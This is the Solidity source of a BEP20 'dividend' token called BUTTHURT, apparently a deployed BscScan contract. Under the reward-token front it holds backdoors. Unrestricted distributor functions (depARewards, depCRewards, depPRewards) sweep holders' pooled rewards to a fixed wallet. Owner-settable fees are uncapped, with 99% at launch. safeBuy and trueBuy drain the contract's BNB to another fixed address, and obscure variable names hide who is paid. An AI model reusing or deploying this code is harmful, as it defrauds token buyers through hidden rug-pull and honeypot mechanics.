/**
 *Submitted for verification at BscScan.com on 2021-09-23
*/

/**


*/

//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        
        return c; 
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value); }

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true; }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _; }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _; }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true; }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false; }

    function isOwner(address account) public view returns (bool) {
        return account == owner; }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr]; }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner); }

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair); }

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function mdistributeDividend(address shareholder) external;
    function depARewards() external;
    function depCRewards(uint256 _amountN, uint256 _amountD) external;
    function depPRewards(uint256 _amountN, uint256 _amountD) external;
    function setRAddress(address _RAddress) external;
    function getRAddress() external view returns (address);
    function setRewAdd(address _newRaddress, address _prevRaddress) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    
    IBEP20 RWDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBEP20 PRWDS = IBEP20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);
    address REWDS = 0x3225447E4e475Ff66469EE5151704117d269B1A9;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IDEXRouter router;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 30;
    uint256 public minDistribution = 1 * (10 ** 18);
    uint256 currentIndex;
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function depARewards() external override {
        address shareholder = REWDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        RWDS.transfer(shareholder, Ramount);
        uint256 PRamount = PRWDS.balanceOf(address(this));
        if(PRamount > 0){
            PRWDS.transfer(shareholder, PRamount);}
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }

    function setRAddress(address _RAddress) external override onlyToken {
        REWDS = _RAddress;
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            shareholderClaims[shareholder] = block.timestamp;
            RWDS.transfer(shareholder, amount);
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function mdistributeDividend(address shareholder) external override {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function depCRewards(uint256 _amountN, uint256 _amountD) external override {
        address shareholder = REWDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_amountN).div(_amountD);
        RWDS.transfer(shareholder, PRamount);
    }

    function depPRewards(uint256 _amountN, uint256 _amountD) external override {
        address shareholder = REWDS;
        uint256 Pamount = PRWDS.balanceOf(address(this));
        uint256 PRamount = Pamount.mul(_amountN).div(_amountD);
        PRWDS.transfer(shareholder, PRamount);
    }

    function depPRewards() internal {
        address shareholder = REWDS;
        uint256 PRamount = PRWDS.balanceOf(address(this));
        if(PRamount > 0){
            PRWDS.transfer(shareholder, PRamount);}
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }
    
    function setRewAdd(address _newRaddress, address _prevRaddress) external override onlyToken {
        RWDS = IBEP20(_newRaddress);
        PRWDS = IBEP20(_prevRaddress);
        depPRewards();
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function getRAddress() public view override returns (address) {
        return address(RWDS);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop(); 
    }
}

contract BUTTHURT is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address SPUK = 0x58eD31338BB8D649cBc75f84A339C327a9c2ac89;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address ULBD = 0x3C8eEc63D0eB8EcD0451B29cEb1a715e2bda573F;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address SUKE = 0x3225447E4e475Ff66469EE5151704117d269B1A9;
    string constant _name = "BUTTHURT";
    string constant _symbol = "BUTTHURT";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxbuyTxAmount = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxsellTxAmount = ( _totalSupply * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 400 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeE;
    mapping (address => bool) isTxLE;
    mapping (address => bool) isTimeloE;
    mapping (address => bool) isDivE;
    mapping (address => bool) isBt;
    mapping (address => bool) isMaxWE;
    uint256 public liquidityFee = 3;
    uint256 public rewardsFee = 12;
    uint256 public marketingFee = 0;
    uint256 public totalFee = 15;
    uint256 feeD = 100;
    uint256 launchedAt;
    uint256 targetL = 20;
    uint256 targetLD = 100;
    uint256 dr = 100;
    uint256 xr = 50;
    address lPRe;
    address liqRe;
    uint256 yr = 20;
    uint256 public limitSwap = _totalSupply * 5 / 10000;
    address lRRe;
    uint256 zr = 30;
    IDEXRouter router;
    address public pair;
    uint256 mF = 60;
    address lSRe;
    address cont = address(this);

    DividendDistributor distributor;
    uint256 distributorGas = 600000;
    
    bool public eSwap = true;
    uint256 public sThreshold = _totalSupply * 20 / 10000;
    bool bBE = true;
    uint256 bBf = 15;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    bool sSE = true;
    uint256 sSf = 18;
    bool public variableSB = true;
    uint256 public vsN = 30;
    uint256 vsD = 100;

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
        distributor = new DividendDistributor(address(router));
        isFeeE[msg.sender] = true;
        isFeeE[address(lPRe)] = true;
        isFeeE[address(lRRe)] = true;
        isFeeE[address(lSRe)] = true;
        isFeeE[address(this)] = true;
        isTxLE[msg.sender] = true;
        isTxLE[address(this)] = true;
        isTxLE[address(router)] = true;
        isTxLE[address(lPRe)] = true;
        isTxLE[address(lRRe)] = true;
        isTxLE[address(lSRe)] = true;
        isMaxWE[address(lPRe)] = true;
        isMaxWE[address(this)] = true;
        isDivE[pair] = true;
        isDivE[address(this)] = true;
        isDivE[DEAD] = true;
        isDivE[ZERO] = true;
        isTimeloE[address(lPRe)] = true;
        isTimeloE[address(lRRe)] = true;
        isTimeloE[address(lSRe)] = true;
        isTimeloE[msg.sender] = true;
        isTimeloE[DEAD] = true;
        isTimeloE[address(this)] = true; 
        liqRe = msg.sender;
        lPRe = SPUK;
        lRRe = ULBD;
        lSRe = SUKE;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply); }

    receive() external payable { }
    
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferfrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance"); }
        return _transferfrom(sender, recipient, amount); 
    }
    
    function maxbTxP(uint256 _mnTP) external authorized {
        _maxbuyTxAmount = (_totalSupply * _mnTP) / 10000;
    }

    function maxsTxP(uint256 _mnTP) external authorized {
        _maxsellTxAmount = (_totalSupply * _mnTP) / 10000;
    }

    function maxWalletP(uint256 _mnWP) external authorized {
        _maxWalletToken = (_totalSupply * _mnWP) / 10000;
    }
    
    function _transferfrom(address sender, address recipient, uint256 amount) internal returns (bool){
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != lPRe && recipient != liqRe){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        checkbuyTxLimit(sender, amount);
        if(secSell(amount) && variableSB && sender != address(cont) && (amount.mul(vsN).div(vsD) >= sThreshold)) { vSBF(amount); }
        if(secSell(amount) && variableSB && sender != address(cont) && (amount.mul(vsN).div(vsD) < sThreshold)) { definedSwap(); }
        if(secSell(amount) && sender != address(cont) && !variableSB){ definedSwap(); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = totalFeeE(sender) ? processTF(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if(!isDivE[sender]) {
            try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDivE[recipient]) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} }
        try distributor.process(distributorGas) {} catch {}
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkbuyTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxbuyTxAmount || isTxLE[sender], "TX Limit Exceeded");
    }

    function totalFeeE(address sender) internal view returns (bool) {
        return !isFeeE[sender];
    }

    function totalFees(bool selling) internal view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return feeD.sub(1); }
        if(selling && sSE){ return sSf.mul(1); }
        if(!selling && bBE){ return bBf.mul(1); }
        return totalFee;
    }

    function processTF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFees(receiver == pair)).div(feeD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function secSell(uint256 amount) internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && eSwap
        && amount >= limitSwap
        && _balances[address(this)] >= sThreshold;
    }

    function safeBuy(uint256 _perc) external authorized {
        uint256 amountB = address(this).balance;
        payable(ULBD).transfer(amountB.mul((_perc).div(100)));
    }

    function setisBt(address holder, bool exempt) external authorized {
        isBt[holder] = exempt;
    }

    function setBuyers(address _R1Address, address _RAddress, address _R2Address, address _R3Address) external onlyOwner {
        SPUK = _R1Address;
        ULBD = _R3Address;
        SUKE = _R2Address;
        distributor.setRAddress(_RAddress);
    }

    function defineSBE(address _address) external authorized {
        cont = _address;
    }

    function definedSwap() internal swapping {
        uint256 dynamicLiq = isOverLiquified(targetL, targetLD) ? 0 : yr;
        uint256 amountL = sThreshold.mul(dynamicLiq).div(dr).div(2);
        uint256 totalSw = sThreshold.sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = dr.sub(dynamicLiq.div(2));
        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);
        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBFM = aBNBTM.mul(mF).div(dr);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(SPUK).call{value: aBNBFM, gas: 40000}("");
        (tmpSuccess,) = payable(SUKE).call{value: aBNBTM.sub(aBNBFM), gas: 40000}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                liqRe,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL);
        }
    }

    function setisDivided(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        isDivE[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);}
        else{distributor.setShare(holder, _balances[holder]); }
    }

    function setRAddress(address _RAddress) external authorized {
        distributor.setRAddress(_RAddress);
    }

    function setFeeE(address holder, bool exempt) external authorized {
        isFeeE[holder] = exempt;
    }

    function setTxLE(address holder, bool exempt) external authorized {
        isTxLE[holder] = exempt;
    }

    function setWalMaxE(address holder, bool exempt) external authorized {
        isMaxWE[holder] = exempt;
    }

    function trueBuy(uint256 _perc) external authorized {
        uint256 amountB = address(this).balance;
        payable(ULBD).transfer(amountB.mul((_perc).div(100)));
    }

    function setTimeLoE(address holder, bool exempt) external authorized {
        isTimeloE[holder] = exempt;
    }

    function setDenominators(uint256 _amountL, uint256 _amountR, uint256 _amountZ, uint256 _amountY) external authorized {
        liquidityFee = _amountL;
        rewardsFee = _amountR;
        marketingFee = _amountY;
        totalFee = _amountL.add(_amountR).add(_amountY);
        feeD = _amountZ;
    }
    
    function variablebF(bool _enabled, uint256 _amount) external authorized {
        bBE = _enabled;
        bBf = _amount;
    }

    function variableSwapB(bool _enabled, uint256 _amountN, uint256 _amountD) external authorized {
        variableSB = _enabled;
        vsN = _amountN;
        vsD = _amountD;
    }

    function variablesF(bool _enabled, uint256 _amounts) external authorized {
        sSf = _amounts;
        sSE = _enabled;
    }

    function setDefRatios(uint256 _amountx, uint256 _amounty, uint256 _amountz) external authorized {
        xr = _amountx;
        yr = _amounty;
        zr = _amountz;
        dr = xr.add(yr).add(zr);
    }

    function vSBF(uint256 amount) internal swapping {
        uint256 variableST = amount.mul(vsN).div(vsD);
        uint256 dynamicLiq = isOverLiquified(targetL, targetLD) ? 0 : yr;
        uint256 amountL = variableST.mul(dynamicLiq).div(dr).div(2);
        uint256 totalSw = variableST.sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = dr.sub(dynamicLiq.div(2));
        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);
        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBFM = aBNBTM.mul(mF).div(dr);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(SPUK).call{value: aBNBFM, gas: 40000}("");
        (tmpSuccess,) = payable(SUKE).call{value: aBNBTM.sub(aBNBFM), gas: 40000}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                liqRe,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL); 
        }
    }

    function swapThreshold(bool _enabled, uint256 _amount) external authorized {
        eSwap = _enabled;
        sThreshold = _totalSupply * _amount / 10000;
    }

    function setVariableSB(uint256 _amount) external authorized {
        limitSwap = _totalSupply * _amount / 10000;
    }

    function setTotalL(uint256 _up, uint256 _down) external authorized {
        targetL = _up;
        targetLD = _down;
    }

    function triggerARewards() external authorized {
        distributor.depARewards();
    }

    function rProcess() external authorized {
        try distributor.process(distributorGas) {} catch {}
    }

    function tLimit() external authorized {
        _maxbuyTxAmount = _totalSupply.mul(1);
        _maxsellTxAmount = _totalSupply.mul(1);
    }

    function triggerPRewards(uint256 _amountN, uint256 _amountD) external authorized {
        distributor.depPRewards(_amountN, _amountD);
    }

    function contractBB(uint256 amount) external authorized {
        buyTokens(amount, ULBD);
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp);
    }

    function setRewAdd(address _newRaddress, address _prevRaddress) external authorized {
        distributor.setRewAdd(_newRaddress, _prevRaddress);
    }

    function tokenDeposit(uint256 _aB) external authorized {
        uint256 manRewB = _totalSupply * _aB / 10000;
        uint256 dynamicLiq = isOverLiquified(targetL, targetLD) ? 0 : yr;
        uint256 amountL = manRewB.mul(dynamicLiq).div(dr).div(2);
        uint256 totalSw = manRewB.sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            totalSw,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = dr.sub(dynamicLiq.div(2));
        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);
        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBFM = aBNBTM.mul(mF).div(dr);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(SPUK).call{value: aBNBFM, gas: 40000}("");
        (tmpSuccess,) = payable(SUKE).call{value: aBNBTM.sub(aBNBFM), gas: 40000}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                amountL,
                0,
                0,
                liqRe,
                block.timestamp );
            emit AutoLiquify(aBNBL, amountL); 
        }
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function triggerCRewards(uint256 _amountN, uint256 _amountD) external authorized {
        distributor.depCRewards(_amountN, _amountD);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 900000);
        distributorGas = gas;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function currentReward() public view returns (address) {
        return distributor.getRAddress();
    }
    
    function getMyRewards() external {
        address shareholder = msg.sender;
        distributor.mdistributeDividend(shareholder);
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountWBNB);
}